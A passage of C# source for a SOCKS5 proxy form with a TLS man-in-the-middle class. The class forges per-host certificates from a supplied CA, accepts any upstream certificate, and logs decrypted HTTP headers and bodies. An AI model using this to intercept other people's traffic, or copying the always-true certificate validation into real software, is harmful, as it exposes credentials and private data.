                        var totalLen = fragments.Sum(f => f.Item2.Length) + payload.Length;
                        byte[] fullPayload = new byte[totalLen];
                        int p = 0;
                        foreach (var f in fragments) { Array.Copy(f.Item2, 0, fullPayload, p, f.Item2.Length); p += f.Item2.Length; }
                        Array.Copy(payload, 0, fullPayload, p, payload.Length);
                        payload = fullPayload;
                        clientBuffers[clientEp].Clear();
                        clientBuffers.Remove(clientEp);
                        PostUi($"Reassembled UDP payload length={payload.Length} for {clientEp}->{destAddr}:{destPort}");
                    }

                    // QUIC Initial (best-effort) - check SNI in ClientHello inside QUIC
                    if (payload.Length > 5 && (payload[0] & 0xC0) == 0xC0)
                    {
                        try
                        {
                            var sni = TryParseSni(payload);
                            if (!string.IsNullOrEmpty(sni))
                                PostUi($"QUIC Initial packet: SNI={sni} from {clientEp}");
                        }
                        catch { }
                    }

                    PostUi($"UDP -> {destAddr}:{destPort}, {payload.Length} bytes");
                    if (payload.Length == 0) { PostUi("Payload empty"); }
                    else if (LooksLikeTextLocal(payload))
                    {
                        string txt = null;
                        try { txt = Encoding.UTF8.GetString(payload); } catch { try { txt = Encoding.ASCII.GetString(payload); } catch { } }
                        PostUi($"Payload (text preview): {TruncLocal(txt, 400)}");
                    }
                    else
                    {
                        PostUi($"Payload preview (hex): {HexPreview(payload, 80)}");
                    }

                    if (destPort == 53)
                    {
                        string qname = TryParseDnsQueryName(payload);
                        if (!string.IsNullOrEmpty(qname)) PostUi($"DNS query for: {qname}");
                    }

                    string poolKey = destAddr + ":" + destPort;
                    UdpClient remoteUdp = null;
                    if (!udpClientPool.TryGetValue(poolKey, out remoteUdp))
                    {
                        remoteUdp = new UdpClient();
                        udpClientPool[poolKey] = remoteUdp;
                    }

                    try
                    {
                        await remoteUdp.SendAsync(payload, payload.Length, destAddr, destPort);
                        var recvTask = remoteUdp.ReceiveAsync();
                        var completed = await Task.WhenAny(recvTask, Task.Delay(5000));
                        if (completed == recvTask)
                        {
                            var resp = recvTask.Result;
                            byte[] remotePayload = resp.Buffer;

                            byte respAtyp = (byte)(resp.RemoteEndPoint.Address.AddressFamily == AddressFamily.InterNetwork ? 0x01 : 0x04);
                            byte[] addrBytes = resp.RemoteEndPoint.Address.GetAddressBytes();
                            byte[] portBytes = new byte[] { (byte)(resp.RemoteEndPoint.Port >> 8), (byte)(resp.RemoteEndPoint.Port & 0xFF) };
                            byte[] respPacket = new byte[3 + 1 + addrBytes.Length + 2 + remotePayload.Length];
                            int ro = 0; respPacket[ro++] = 0x00; respPacket[ro++] = 0x00; respPacket[ro++] = 0x00; respPacket[ro++] = respAtyp;
                            Array.Copy(addrBytes, 0, respPacket, ro, addrBytes.Length); ro += addrBytes.Length;
                            respPacket[ro++] = portBytes[0]; respPacket[ro++] = portBytes[1];
                            Array.Copy(remotePayload, 0, respPacket, ro, remotePayload.Length);

                            await udpRelay.SendAsync(respPacket, respPacket.Length, clientEp);

                            int rlen = remotePayload.Length;
                            if (rlen == 0) PostUi($"Response from {resp.RemoteEndPoint}: empty");
                            else if (LooksLikeTextLocal(remotePayload))
                            {
                                string textResp = null;
                                try { textResp = Encoding.UTF8.GetString(remotePayload); } catch { try { textResp = Encoding.ASCII.GetString(remotePayload); } catch { } }
                                PostUi($"Response from {resp.RemoteEndPoint} (text preview): {TruncLocal(textResp, 400)}");
                            }
                            else
                            {
                                PostUi($"Response from {resp.RemoteEndPoint} (hex preview): {HexPreview(remotePayload, 80)}");
                            }
                        }
                        else PostUi($"No response from {destAddr}:{destPort} (timeout)");
                    }
                    catch (Exception ex) { PostUi($"UDP forward error: {ex.Message}"); }
                }
            }
            catch (Exception ex) { PostUi("UDP relay error: " + ex.Message); }
        }

        // Helpers used across the class
        private static string Trunc(string s, int max)
        {
            if (string.IsNullOrEmpty(s)) return s;
            return s.Length <= max ? s : s.Substring(0, max) + "…";
        }

        private static bool LooksLikeText(byte[] data)
        {
            int printable = 0;
            foreach (var b in data)
            {
                if (b == 9 || b == 10 || b == 13) { printable++; continue; }
                if (b >= 32 && b <= 126) printable++;
            }
            return data.Length == 0 ? false : (printable / (double)data.Length) > 0.9;
        }

        private static byte[] TryDecodeChunked(byte[] data)
        {
            try
            {
                var msIn = new MemoryStream(data);
                var msOut = new MemoryStream();
                var sr = new StreamReader(msIn, Encoding.ASCII);
                while (true)
                {
                    string line = sr.ReadLine();
                    if (line == null) break;
                    int semi = line.IndexOf(';');
                    string lenStr = (semi >= 0) ? line.Substring(0, semi) : line;
                    int len = Convert.ToInt32(lenStr.Trim(), 16);
                    if (len == 0) break;
                    int readPos = (int)msIn.Position;
                    var buffer = new byte[len];
                    int got = msIn.Read(buffer, 0, len);
                    if (got > 0) msOut.Write(buffer, 0, got);
                    // consume CRLF
                    if (msIn.ReadByte() == '\r' && msIn.ReadByte() == '\n') { }
                }
                return msOut.ToArray();
            }
            catch
            {
                return null;
            }
        }

        private async Task<bool> StartNegotiation(Socket clientSock)
        {
            byte[] version = await RecvAll(clientSock, 1);
            if (version == null || version[0] != 5) return false;
            byte[] nMethods = await RecvAll(clientSock, 1);
            if (nMethods == null) return false;
            byte[] methods = await RecvAll(clientSock, nMethods[0]);
            if (methods == null) return false;
            await clientSock.SendAsync(new ArraySegment<byte>(new byte[] { 5, 0 }), SocketFlags.None);
            return true;
        }

        private async Task SendSocksReply(Socket sock, byte replyCode, IPAddress bindAddr = null, ushort bindPort = 0)
        {
            if (bindAddr == null) bindAddr = IPAddress.Any;
            byte[] addrBytes = bindAddr.GetAddressBytes();
            byte[] portBytes = new byte[2] { (byte)(bindPort >> 8), (byte)(bindPort & 0xFF) };
            byte[] reply = new byte[10] { 5, replyCode, 0, 1, addrBytes[0], addrBytes[1], addrBytes[2], addrBytes[3], portBytes[0], portBytes[1] };
            await sock.SendAsync(new ArraySegment<byte>(reply), SocketFlags.None);
        }

        private async Task<byte[]> RecvAll(Socket sock, int size)
        {
            byte[] data = new byte[size];
            int received = 0;
            while (received < size)
            {
                int r = await sock.ReceiveAsync(new ArraySegment<byte>(data, received, size - received), SocketFlags.None);
                if (r == 0) return null;
                received += r;
            }
            return data;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            int port = int.Parse(textBox1.Text);
            _acceptCts = new CancellationTokenSource();
            _acceptLoopTask = AcceptLoop(port, _acceptCts.Token);
            button1.Enabled = false;
            button2.Enabled = true;
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            _acceptCts?.Cancel();
            listenerSocket?.Close();
            if (_acceptLoopTask != null) await Task.WhenAny(_acceptLoopTask, Task.Delay(500));
            button1.Enabled = true;
            button2.Enabled = false;
        }

        private void Reverse_Proxy_FormClosing(object sender, FormClosingEventArgs e)
        {
            _acceptCts?.Cancel();
            listenerSocket?.Close();
        }

        private void textBox2_TextChanged(object sender, EventArgs e) { }

        private void Reverse_Proxy_Load(object sender, EventArgs e)
        {
            listView1.GetType().GetProperty("DoubleBuffered", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic).SetValue(listView1, true, null);
        }

        private void copySelectedItemsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 0) return;

            var sb = new StringBuilder();
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                var line = string.Join("\t", item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(s => s.Text));
                sb.AppendLine(line);
            }
            string textToCopy = sb.ToString();

            Thread staThread = new Thread(() =>
            {
                try { Clipboard.SetText(textToCopy); }
                catch (Exception ex) { MessageBox.Show($"Clipboard copy failed: {ex.Message}"); }
            });
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join();
        }

        private void ListView1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                var hit = listView1.HitTest(e.Location);
                if (hit.Item != null)
                {
                    if (!hit.Item.Selected)
                    {
                        listView1.SelectedItems.Clear();
                        hit.Item.Selected = true;
                    }
                }
                else
                {
                    listView1.SelectedItems.Clear();
                }
            }
        }

        private void PostUi(string text)
        {
            try
            {
                string show = text.Length > UI_TRUNCATE_GLOBAL ? text.Substring(0, UI_TRUNCATE_GLOBAL) + "…(truncated)" : text;
                listView1?.BeginInvoke((MethodInvoker)(() =>
                {
                    listView1.Items.Add($"[{DateTime.Now:HH:mm:ss}] {show}");
                    //listView1.AutoResizeColumn(0, ColumnHeaderAutoResizeStyle.ColumnContent);
                    //if (listView1.Items.Count > 0) listView1.EnsureVisible(listView1.Items.Count - 1);
                }));
            }
            catch { }
        }

        // Minimal SNI parser used in UDP QUIC initial attempts
        private static string TryParseSni(byte[] data)
        {
            try
            {
                if (data == null || data.Length < 5) return null;
                int pos = 0;
                if (data[pos++] != 0x16) return null;
                pos += 2;
                if (pos + 2 > data.Length) return null;
                int recLen = (data[pos] << 8) | data[pos + 1];
                pos += 2;
                if (pos + recLen > data.Length) return null;
                if (pos + 4 > data.Length) return null;
                byte hsType = data[pos++];
                if (hsType != 0x01) return null;
                int hsLen = (data[pos] << 16) | (data[pos + 1] << 8) | data[pos + 2]; pos += 3;
                pos += 2 + 32;
                int sessionIdLen = data[pos++]; pos += sessionIdLen;
                int csLen = (data[pos] << 8) | data[pos + 1]; pos += 2 + csLen;
                int compLen = data[pos++]; pos += compLen;
                int extLen = (data[pos] << 8) | data[pos + 1]; pos += 2;
                int extEnd = pos + extLen;
                while (pos + 4 <= extEnd)
                {
                    int extType = (data[pos] << 8) | data[pos + 1];
                    int extLength = (data[pos + 2] << 8) | data[pos + 3];
                    pos += 4;
                    if (extType == 0x00)
                    {
                        int sPos = pos;
                        if (sPos + 2 > pos + extLength) break;
                        int listLen = (data[sPos] << 8) | data[sPos + 1]; sPos += 2;
                        int listEnd = sPos + listLen;
                        while (sPos + 3 <= listEnd)
                        {
                            byte nameType = data[sPos++];
                            int nameLen = (data[sPos] << 8) | data[sPos + 1];
                            sPos += 2;
                            if (nameType == 0)
                            {
                                return Encoding.ASCII.GetString(data, sPos, nameLen);
                            }
                            sPos += nameLen;
                        }
                        break;
                    }
                    pos += extLength;
                }
            }
            catch { }
            return null;
        }

        /// <summary>
        /// MITM helper: creates per-host leaf certs signed by provided CA, performs SslStream handshake to client and upstream,
        /// and pipes plaintext between the two SslStreams. Includes a simple cert cache and HTTP body preview (handles gzip/deflate/br and chunked).
        /// </summary>
        public class MitmHandler : IDisposable
        {
            private readonly X509Certificate2 _ca; // CA PFX with private key
            private readonly ConcurrentDictionary<string, X509Certificate2> _cache;
            private readonly Action<string> _log;

            // limits
            private const int MAX_BODY_BUFFER = 1024 * 1024; // 1 MB max buffer for inspection
            private const int BODY_PREVIEW = 1000;

            public MitmHandler(X509Certificate2 caPfx, Action<string> logger = null)
            {
                if (caPfx == null || !caPfx.HasPrivateKey) throw new ArgumentException("CA certificate with private key is required", nameof(caPfx));
                _ca = caPfx;
                _cache = new ConcurrentDictionary<string, X509Certificate2>();
                _log = logger ?? (_ => { });
            }

            public void Dispose()
            {
                foreach (var kv in _cache)
                {
                    try { kv.Value?.Dispose(); } catch { }
                }
            }

            public async Task HandleMitmAsync(Stream clientCombinedStream, string sniHost, CancellationToken ct = default)
            {
                if (clientCombinedStream == null) throw new ArgumentNullException(nameof(clientCombinedStream));
                if (string.IsNullOrEmpty(sniHost)) sniHost = "localhost";

                // Attempt MITM
                var leafCert = GetOrCreateCertForHost(sniHost);
                SslStream clientSsl = null;
                TcpClient remote = null;
                SslStream remoteSsl = null;

                try
                {
                    clientSsl = new SslStream(clientCombinedStream, leaveInnerStreamOpen: true);
                    await clientSsl.AuthenticateAsServerAsync(
                        leafCert,
                        clientCertificateRequired: false,
                        enabledSslProtocols: SslProtocols.Tls12 | SslProtocols.Tls13,
                        checkCertificateRevocation: false
                    ).ConfigureAwait(false);

                    _log($"Authenticated to client for {sniHost}. Protocol: {clientSsl.SslProtocol}");
                }
                catch (Exception ex)
                {
                    _log($"MITM failed for {sniHost} (possible certificate pinning): {ex.Message}");
                    // Fallback: transparent TCP tunnel
                    await TransparentTcpTunnel(clientCombinedStream, sniHost, 443, ct);
                    return;
                }

                try
                {
                    // Connect to upstream server
                    remote = new TcpClient();
                    await remote.ConnectAsync(sniHost, 443).ConfigureAwait(false);
                    var remoteStream = remote.GetStream();

                    remoteSsl = new SslStream(remoteStream, leaveInnerStreamOpen: false,
                        userCertificateValidationCallback: (sender, cert, chain, sslPolicyErrors) => true);

                    await remoteSsl.AuthenticateAsClientAsync(sniHost, null, SslProtocols.Tls12 | SslProtocols.Tls13, false).ConfigureAwait(false);
                    _log($"Connected to upstream {sniHost}. Protocol: {remoteSsl.SslProtocol}");
                }
                catch (Exception ex)
                {
                    _log("Failed to connect/authenticate to upstream " + sniHost + ": " + ex.Message);
                    try { clientSsl?.Close(); } catch { }
                    try { remote?.Close(); } catch { }
                    return;
                }

                var pipeCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                var t1 = PipePlainAsync(clientSsl, remoteSsl, pipeCts.Token, true); // client->server
                var t2 = PipePlainAsync(remoteSsl, clientSsl, pipeCts.Token, false); // server->client

                try
                {
                    await Task.WhenAny(t1, t2).ConfigureAwait(false);
                }
                catch { }
                finally
                {
                    pipeCts.Cancel();
                    try { await Task.WhenAll(t1, t2).ConfigureAwait(false); } catch { }
                    try { clientSsl?.Close(); } catch { }
                    try { remoteSsl?.Close(); } catch { }
                    try { remote?.Close(); } catch { }
                }
            }

            /// <summary>
            /// Simple transparent TCP tunnel (no MITM) for pinned hosts
            /// </summary>
            private async Task TransparentTcpTunnel(Stream clientStream, string host, int port, CancellationToken ct)
            {
                TcpClient remote = null;
                NetworkStream remoteStream = null;
                CancellationTokenSource linkedCts = null;

                try
                {
                    remote = new TcpClient();
                    await remote.ConnectAsync(host, port).ConfigureAwait(false);
                    remoteStream = remote.GetStream();

                    // Use a linked CTS so we can cancel both directions if one ends
                    linkedCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                    CancellationToken linkedToken = linkedCts.Token;

                    const int BUFFER_SIZE = 81920; // same default used by Stream.CopyToAsync

                    // Start full-duplex copies (note: bufferSize before cancellation token)
                    var t1 = clientStream.CopyToAsync(remoteStream, BUFFER_SIZE, linkedToken); // client -> server
                    var t2 = remoteStream.CopyToAsync(clientStream, BUFFER_SIZE, linkedToken); // server -> client

                    // Wait for either direction to complete, then cancel the other
                    await Task.WhenAny(t1, t2).ConfigureAwait(false);
                    try { linkedCts.Cancel(); } catch { }

                    // Await both so exceptions propagate (if any)
                    await Task.WhenAll(t1, t2).ConfigureAwait(false);
                }
                catch (OperationCanceledException) { /* cancelled, normal */ }
                catch (Exception ex)
                {
                    _log($"Transparent tunnel failed for {host}: {ex.Message}");
                }
                finally
                {
                    try { linkedCts?.Cancel(); } catch { }
                    try { remoteStream?.Close(); } catch { }
                    try { remote?.Close(); } catch { }
                    try { clientStream?.Close(); } catch { }
                    try { linkedCts?.Dispose(); } catch { }
                }
            }

            /// <summary>
            /// Pipes plaintext between src->dst. If isRequest==false then we attempt to parse HTTP response headers+body for logging.
            /// This method still forwards bytes immediately (so it doesn't delay actual HTTP flow).
            /// </summary>
            private async Task PipePlainAsync(Stream src, Stream dst, CancellationToken ct, bool isRequest)
            {
                byte[] buffer = new byte[16 * 1024];
                var accum = new MemoryStream(); // used for header/body reconstruction for logging only
                try
                {
                    while (!ct.IsCancellationRequested)
                    {
                        int r = 0;
                        try
                        {
                            r = await src.ReadAsync(buffer, 0, buffer.Length, ct).ConfigureAwait(false);
                        }
                        catch (OperationCanceledException) { break; }
                        catch (Exception ex)
                        {
                            _log("PipePlain read failed: " + ex.Message);
                            break;
                        }

                        if (r <= 0) break;

                        // Forward immediately
                        try
                        {
                            await dst.WriteAsync(buffer, 0, r, ct).ConfigureAwait(false);
                            await dst.FlushAsync(ct).ConfigureAwait(false);
                        }
                        catch (Exception ex)
                        {
                            _log("PipePlain write failed: " + ex.Message);
                            break;
                        }

                        // For logging only: accumulate up to MAX and try parse if response direction
                        try
                        {
                            if (!isRequest)
                            {
                                // append to accumulator (bounded)
                                if (accum.Length + r <= MAX_BODY_BUFFER)
                                    accum.Write(buffer, 0, r);
                                else
                                {
                                    // if too large, reset and keep last chunk
                                    accum.SetLength(0);
                                    if (r <= MAX_BODY_BUFFER) accum.Write(buffer, 0, r);
                                }

                                // Try to parse HTTP response(s) in accumulator
                                ProcessAccumulatedResponses(accum);
                            }
                            else
                            {
                                // Requests: lightweight log of headers if present
                                accum.Write(buffer, 0, r);
                                TryLogRequestHeaders(accum);
                            }
                        }
                        catch { /* ignore logging errors */ }
                    }
                }
                catch { /* ignore */ }
                finally
                {
                    try { accum.Dispose(); } catch { }
                }
            }

            private void TryLogRequestHeaders(MemoryStream accum)
            {
                try
                {
                    var arr = accum.ToArray();
                    string maybe = null;
                    try { maybe = Encoding.ASCII.GetString(arr); } catch { maybe = null; }
                    if (string.IsNullOrEmpty(maybe)) return;
                    int he = maybe.IndexOf("\r\n\r\n", StringComparison.Ordinal);
                    if (he < 0) return;
                    string headers = maybe.Substring(0, he);
                    _log("[C->S] HTTP headers:\r\n" + Trunc(headers, 1000));
                    // once shown, clear accumulator so we don't re-log repeatedly
                    accum.SetLength(0);
                }
                catch { }
            }

            private void ProcessAccumulatedResponses(MemoryStream accum)
            {
                // Try to find header end; if found, attempt to determine body length (Content-Length or chunked)
                var arr = accum.ToArray();
                if (arr == null || arr.Length == 0) return;
                string headerText = null;
                int headerEnd = -1;
                try
                {
                    headerText = Encoding.ASCII.GetString(arr);
                    headerEnd = headerText.IndexOf("\r\n\r\n", StringComparison.Ordinal);
                }
                catch { headerEnd = -1; }

                if (headerEnd < 0)
                {
                    // nothing to do yet
                    return;
                }

                // parse headers
                string headers = headerText.Substring(0, headerEnd);
                _log("[S->C] HTTP headers:\r\n" + Trunc(headers, 1000));

                // determine content length or chunked
                bool isChunked = false;
                int contentLength = -1;
                bool hasContentEncoding = false;
                string contentEncoding = null;

                foreach (var line in headers.Split(new[] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries))
                {
                    int idx = line.IndexOf(':');
                    if (idx <= 0) continue;
                    string name = line.Substring(0, idx).Trim();
                    string val = line.Substring(idx + 1).Trim();
                    if (string.Equals(name, "Content-Length", StringComparison.OrdinalIgnoreCase))
                    {
                        int.TryParse(val, out contentLength);
                    }
                    else if (string.Equals(name, "Transfer-Encoding", StringComparison.OrdinalIgnoreCase))
                    {
                        if (val.IndexOf("chunked", StringComparison.OrdinalIgnoreCase) >= 0) isChunked = true;
                    }
                    else if (string.Equals(name, "Content-Encoding", StringComparison.OrdinalIgnoreCase))
                    {
                        hasContentEncoding = true;
                        contentEncoding = val.ToLowerInvariant();
                    }
                }

                // body bytes present after headerEnd+4
                byte[] body = arr.Skip(headerEnd + 4).ToArray();

                if (isChunked)
                {
                    // Try to dechunk as much as available; if the full dechunk completes, decode and log, otherwise wait.
                    byte[] dechunked = TryDechunk(body, out bool complete);
                    if (!complete)
                    {
                        // not all chunks available yet — wait for more data
                        return;
                    }

                    // decode if needed
                    string decoded = TryDecodeContent(dechunked, contentEncoding);
                    if (decoded != null)
                    {
                        _log("[S->C] Body (decompressed, truncated): " + Trunc(decoded, BODY_PREVIEW));
                    }
                    else
                    {
                        _log("[S->C] Body (chunked) size: " + (dechunked == null ? 0 : dechunked.Length) + " bytes");
                    }

                    // consumed the parsed response — reset accumulator so next response goes into fresh buffer
                    accum.SetLength(0);
                    return;
                }
                else
                {
                    // if Content-Length present, ensure we have full body
                    if (contentLength >= 0)
                    {
                        if (body.Length < contentLength)
                        {
                            // wait for more bytes
                            return;
                        }

                        byte[] finalBody = body.Take(contentLength).ToArray();
                        string decoded = TryDecodeContent(finalBody, contentEncoding);
                        if (decoded != null)
                            _log("[S->C] Body (decompressed, truncated): " + Trunc(decoded, BODY_PREVIEW));
                        else
                            _log("[S->C] Body: " + finalBody.Length + " bytes (binary or unknown encoding)");

                        // remove consumed bytes from accum (there may be additional pipelined responses; keep remainder)
                        int consumed = headerEnd + 4 + contentLength;
                        byte[] remainder = arr.Skip(consumed).ToArray();
                        accum.SetLength(0);
                        if (remainder.Length > 0) accum.Write(remainder, 0, remainder.Length);
                        return;
                    }
                    else
                    {
                        // No content-length and not chunked — server may close connection to terminate. If body present, try decode otherwise log length.
                        if (body.Length > 0)
                        {
                            string decoded = TryDecodeContent(body, contentEncoding);
                            if (decoded != null)
                                _log("[S->C] Body (decompressed, truncated): " + Trunc(decoded, BODY_PREVIEW));
                            else
                                _log("[S->C] Body: " + body.Length + " bytes (binary or unknown encoding)");
                        }
                        // reset accumulator: server likely finished response and will close connection or pipeline ends.
                        accum.SetLength(0);
                        return;
                    }
                }
            }

            private string TryDecodeContent(byte[] data, string contentEncoding)
            {
                if (data == null) return null;
                try
                {
                    if (string.IsNullOrEmpty(contentEncoding) || contentEncoding.IndexOf("identity", StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        // try UTF8 text detection
                        if (LooksLikeText(data))
                        {
                            try { return Encoding.UTF8.GetString(data); }
                            catch { try { return Encoding.ASCII.GetString(data); } catch { return null; } }
                        }
                        return null;
                    }

                    if (contentEncoding.IndexOf("gzip", StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        try
                        {
                            using (var ms = new MemoryStream(data))
                            using (var gz = new GZipStream(ms, CompressionMode.Decompress))
                            using (var dec = new MemoryStream())
                            {
                                gz.CopyTo(dec);
                                var bytes = dec.ToArray();
                                if (LooksLikeText(bytes))
                                {
                                    try { return Encoding.UTF8.GetString(bytes); }
                                    catch { try { return Encoding.ASCII.GetString(bytes); } catch { return null; } }
                                }
                                return null;
                            }
                        }
                        catch { return null; }
                    }

                    if (contentEncoding.IndexOf("deflate", StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        try
                        {
                            using (var ms = new MemoryStream(data))
                            using (var def = new DeflateStream(ms, CompressionMode.Decompress))
                            using (var dec = new MemoryStream())
                            {
                                def.CopyTo(dec);
                                var bytes = dec.ToArray();
                                if (LooksLikeText(bytes))
                                {
                                    try { return Encoding.UTF8.GetString(bytes); }
                                    catch { try { return Encoding.ASCII.GetString(bytes); } catch { return null; } }
                                }
                                return null;
                            }
                        }
                        catch { return null; }
                    }

                    if (contentEncoding.IndexOf("br", StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        try
                        {
                            using (var ms = new MemoryStream(data))
                            using (var brotli = new BrotliStream(ms, CompressionMode.Decompress))
                            using (var dec = new MemoryStream())
                            {
                                brotli.CopyTo(dec);
                                var bytes = dec.ToArray();
                                if (LooksLikeText(bytes))
                                {
                                    try { return Encoding.UTF8.GetString(bytes); }
                                    catch { try { return Encoding.ASCII.GetString(bytes); } catch { return null; } }
                                }
                                return null;
                            }
                        }
                        catch { return null; }
                    }
                }
                catch { }
                return null;
            }

            private static byte[] TryDechunk(byte[] data, out bool complete)
            {
                complete = false;
                if (data == null || data.Length == 0) return new byte[0];

                try
                {
                    var msOut = new MemoryStream();
                    int pos = 0;
                    while (pos < data.Length)
                    {
                        // read chunk-size line (hex digits) until CRLF
                        int lineEnd = -1;
                        for (int i = pos; i + 1 < data.Length; i++)
                        {
                            if (data[i] == (byte)'\r' && data[i + 1] == (byte)'\n') { lineEnd = i; break; }
                        }
                        if (lineEnd < 0) return null; // incomplete size line
                        string sizeHex = Encoding.ASCII.GetString(data, pos, lineEnd - pos);
                        int chunkSize = 0;
                        if (!int.TryParse(sizeHex.Split(';')[0].Trim(), System.Globalization.NumberStyles.HexNumber, null, out chunkSize))
                            return null;
                        pos = lineEnd + 2;
                        if (chunkSize == 0)
                        {
                            // final chunk found; skip trailing header if any until CRLFCRLF or just CRLF
                            // We consider dechunk complete.
                            complete = true;
                            return msOut.ToArray();
                        }
                        if (pos + chunkSize + 2 > data.Length)
                        {
                            // not enough bytes yet for the chunk and its CRLF
                            return null;
                        }
                        msOut.Write(data, pos, chunkSize);
                        pos += chunkSize;
                        // expect CRLF after chunk
                        if (!(data[pos] == (byte)'\r' && data[pos + 1] == (byte)'\n')) return null;
                        pos += 2;
                    }
                }
                catch { return null; }

                // if we reach here without finding final 0 chunk, it's incomplete
                return null;
            }

            private static string Trunc(string s, int max)
            {
                if (string.IsNullOrEmpty(s)) return s;
                return s.Length <= max ? s : s.Substring(0, max) + "…";
            }

            private static bool LooksLikeText(byte[] data)
            {
                if (data == null || data.Length == 0) return false;
                int printable = 0;
                int toCheck = Math.Min(data.Length, 200);
                for (int i = 0; i < toCheck; i++)
                {
                    byte b = data[i];
                    if (b == 9 || b == 10 || b == 13) { printable++; continue; }
                    if (b >= 32 && b <= 126) printable++;
                }
                return ((double)printable) / toCheck > 0.80;
            }

            private X509Certificate2 GetOrCreateCertForHost(string host)
            {
                if (string.IsNullOrEmpty(host)) host = "localhost";
                X509Certificate2 cached;
                if (_cache.TryGetValue(host, out cached)) return cached;

                lock (_cache)
                {
                    if (_cache.TryGetValue(host, out cached)) return cached;

                    // Create a new key (RSA 2048) for the leaf cert
                    using (RSA rsa = RSA.Create(2048))
                    {
                        var req = new CertificateRequest("CN=" + host, rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);

                        // SAN
                        var sanBuilder = new SubjectAlternativeNameBuilder();
                        sanBuilder.AddDnsName(host);
                        req.CertificateExtensions.Add(sanBuilder.Build());

                        req.CertificateExtensions.Add(new X509KeyUsageExtension(X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment, false));
                        req.CertificateExtensions.Add(new X509EnhancedKeyUsageExtension(new OidCollection { new Oid("1.3.6.1.5.5.7.3.1") }, false));

                        var notBefore = DateTimeOffset.UtcNow.AddMinutes(-5);
                        var notAfter = notBefore.AddYears(2);

                        // serial
                        var serial = Guid.NewGuid().ToByteArray();

                        // Create a certificate signed by the CA
                        using (var signed = req.Create(_ca, notBefore, notAfter, serial))
                        {
                            // Attach the private key and export to PFX
                            using (var signedWithKey = signed.CopyWithPrivateKey(rsa))
                            {
                                // Export PFX (unencrypted)
                                var pfx = signedWithKey.Export(X509ContentType.Pfx);

                                // IMPORTANT: re-import PFX with flags that make the private key usable by SslStream
                                // Use MachineKeySet so the key is persisted to machine store (avoids "Keyset does not exist")
                                var certWithKey = new X509Certificate2(pfx, (string)null,
                                    X509KeyStorageFlags.Exportable | X509KeyStorageFlags.PersistKeySet | X509KeyStorageFlags.MachineKeySet);

                                // Optionally set friendly name
                                try { certWithKey.FriendlyName = host; } catch { }

                                _cache[host] = certWithKey;
                                return certWithKey;
                            }
                        }
                    }
                }
            }
        }// end MitmHandler

    } // end Reverse_Proxy class
} // end namespace
